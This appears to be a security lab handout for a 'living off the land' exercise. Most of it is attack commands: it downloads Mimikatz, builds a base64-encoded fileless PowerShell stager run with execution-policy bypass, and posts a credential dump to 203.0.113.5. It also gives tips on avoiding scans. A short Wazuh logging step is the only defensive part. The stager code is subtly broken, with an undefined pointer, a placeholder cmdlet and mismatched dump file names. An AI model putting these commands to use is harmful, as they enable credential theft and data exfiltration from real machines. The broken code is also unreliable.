Lab 7 – Living‑Off‑the‑Land Lab

Reference commands (full list) – see below.



1\. Setup

\# Powershell on Kali (pwsh)

sudo apt install -y powershell

\# Install Mimikatz (Remote) – alias, or use local binary

wget -O mimikatz.zip https://example.com/mimikatz.zip

2\. File‑less PowerShell Stager

\# Build command that fetches and runs Mimikatz in memory

$cmd = @"

$bytes = ( Invoke-WebRequest 'https://example.com/mimikatz.zip' -UseBasicParsing ).Content

Add-Type -AssemblyName System.IO.Compression.FileSystem

$zip = \[IO.Compression.ZipFile]::OpenRead(\[IO.MemoryStream]::new($bytes))

$zip.Entries | ForEach-Object { $\_.FullName -eq 'mimikatz.exe' | 

&nbsp; ForEach-Object { $exe = $\_; $matrix = $exe.Open().ReadAllBytes()

&nbsp;   \[Runtime.InteropServices.Marshal]::Copy($matrix,0,$ptr,$matrix.Length) }

} | Out-Null

"@



\# Encode to Base64 to run in memory

$enc = \[Convert]::ToBase64String(\[Text.Encoding]::Unicode.GetBytes($cmd))

powershell.exe -ExecutionPolicy Bypass -EncodedCommand $enc

3\. WMI Credentials Dump

\# WMI query for user accounts (just for enumeration)

Get-WmiObject -Class Win32\_UserAccount | Format-Table Name,Domain



\# Run Mimikatz in memory

Invoke-Conveyor token ...   # Actually replaced by the above encoded script

4\. Exfiltrate

$body = Get-Content C:\\Temp\\MimikatzDump.txt -Raw

Invoke-RestMethod -Method Post -Uri https://203.0.113.5/submit -Body $body

5\. Log to Wazuh

\# On the target Windows side – the command line will appear in Wazuh logs

\# (Tail would show the event)

sudo tail -f /var/ossec/logs/ossec.log | grep powershell

6\. Troubleshooting

Symptom	Fix

Mimikatz crash	Ensure the binary is compiled for 64‑bit and no scan is triggered

PowerShell blocked	Use ExecutionPolicy Unrestricted

Exfil fails	Validate destination endpoint acceptance

7\. Full Commands

\# 1. Install PowerShell on Kali

sudo apt update \&\& sudo apt install -y powershell



\# 2. Download Mimikatz comp (plain ZIP)

wget -O mimikatz.zip https://example.com/mimikatz.zip



\# 3. View accounts (WMI)

powershell.exe -Command "Get-WmiObject -Class Win32\_UserAccount | Format-Table Name,Domain"



\# 4. Build in‑memory stager

$cmd = @"

$bytes = ( Invoke-WebRequest 'https://example.com/mimikatz.zip' -UseBasicParsing ).Content

Add-Type -AssemblyName System.IO.Compression.FileSystem

$zip = \[IO.Compression.ZipFile]::OpenRead(\[IO.MemoryStream]::new($bytes))

$zip.Entries | ForEach-Object { $\_.FullName -eq 'mimikatz.exe' | 

&nbsp; ForEach-Object { $exe = $\_.Open(); $raw=$exe.ReadAllBytes(); 

&nbsp;   \[Runtime.InteropServices.Marshal]::Copy($raw,0,$ptr,$raw.Length)}}

"@



$enc = \[Convert]::ToBase64String(\[Text.Encoding]::Unicode.GetBytes($cmd))

powershell.exe -ExecutionPolicy Bypass -EncodedCommand $enc



\# 5. Exfiltrate credentials

$body = Get-Content C:\\Temp\\MimiDump.txt -Raw

Invoke-RestMethod -Method Post -Uri https://203.0.113.5/submit -Body $body

